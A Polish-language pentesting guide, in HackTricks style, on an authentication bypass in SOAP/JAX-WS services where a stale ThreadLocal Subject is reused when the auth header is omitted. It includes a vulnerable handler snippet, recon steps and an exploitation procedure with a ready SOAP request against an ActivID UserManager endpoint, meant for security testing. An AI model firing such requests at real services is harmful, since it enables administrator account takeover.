# SOAP/JAX-WS ThreadLocal Authentication Bypass

{{#include ../banners/hacktricks-training.md}}

## W skrócie

- Niektóre łańcuchy middleware przechowują uwierzytelniony `Subject`/`Principal` wewnątrz statycznego `ThreadLocal` i odświeżają go tylko, gdy nadejdzie właśniwy nagłówek SOAP.
- Ponieważ WebLogic/JBoss/GlassFish recyklingują wątki robocze, pominięcie tego nagłówka powoduje, że ostatni uprzywilejowany `Subject` obsłużony przez dany wątek jest cicho ponownie używany.
- Zalewaj podatny endpoint poprawnie sformułowanymi, pozbawionymi nagłówków SOAP body, aż ponownie użyty wątek przyzna ci skradziony kontekst administratora.

## Przyczyna

Handlery podobne do poniższego nadpisują tożsamość w `ThreadLocal` tylko wtedy, gdy niestandardowy nagłówek jest obecny, więc kontekst poprzedniego żądania przetrwa:
```java
public boolean handleMessage(SOAPMessageContext ctx) {
if (!outbound) {
SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
SOAPHeaderElement e = findHeader(hdr, subjectName);
if (e != null) {
SubjectHolder.setSubject(unmarshal(e));
}
}
return true;
}
```
## Rozpoznanie

1. Wylistuj reguły reverse proxy / routingu, aby zlokalizować ukryte drzewa SOAP, które mogą blokować `?wsdl`, lecz akceptować POSTy (mapuj je równolegle z przepływem w [80,443 - Pentesting Web Methodology](../network-services-pentesting/pentesting-web/README.md)).
2. Rozpakuj artefakty EAR/WAR/EJB (`unzip *.ear`) i sprawdź `application.xml`, `web.xml`, adnotacje `@WebService` oraz handler chains (np. `LoginHandlerChain.xml`), aby odkryć klasę handlera, SOAP header QName i nazwy backing EJB.
3. Jeśli metadata jest nieobecna, brute-force'uj prawdopodobne ścieżki `ServiceName?wsdl` lub tymczasowo poluzuj lab proxies, następnie zaimportuj odzyskany WSDL do narzędzi takich jak [Burp Suite Wsdler](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f), aby wygenerować podstawowe koperty SOAP.
4. Przejrzyj źródła handlera pod kątem `ThreadLocal` keeperów (np. `SubjectHolder.setSubject()`), które nigdy nie są czyszczone, gdy nagłówek uwierzytelniający jest nieobecny lub sformatowany niepoprawnie.

## Eksploatacja

1. Wyślij prawidłowe żądanie **z** proprietarnym nagłówkiem, aby poznać normalne kody odpowiedzi i błędy używane przy nieprawidłowych tokenach.
2. Ponownie wyślij ten sam SOAP body, pomijając nagłówek. Zachowaj poprawność XML i wymagane namespace'y, aby handler zakończył działanie czysto.
3. Pętlij żądanie; gdy trafi na wątek, który wcześniej wykonał uprzywilejowaną akcję, ponownie użyty `Subject` odblokuje chronione operacje, takie jak menedżery użytkowników lub poświadczeń.
```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
<soapenv:Header/>
<soapenv:Body>
<jax:findUserIds>
<arg0></arg0>
<arg1>spl*</arg1>
</jax:findUserIds>
</soapenv:Body>
</soapenv:Envelope>
```
## Weryfikacja błędu

- Podłącz JDWP (`-agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n`) lub podobne debugging hooks, aby obserwować zawartość `ThreadLocal` przed i po każdym wywołaniu, potwierdzając, że nieautoryzowane żądanie odziedziczyło wcześniejszego administratora `Subject`.

## Referencje

- [Synacktiv – ActivID administrator account takeover: the story behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [PortSwigger – Wsdler (WSDL parser) extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)

{{#include ../banners/hacktricks-training.md}}
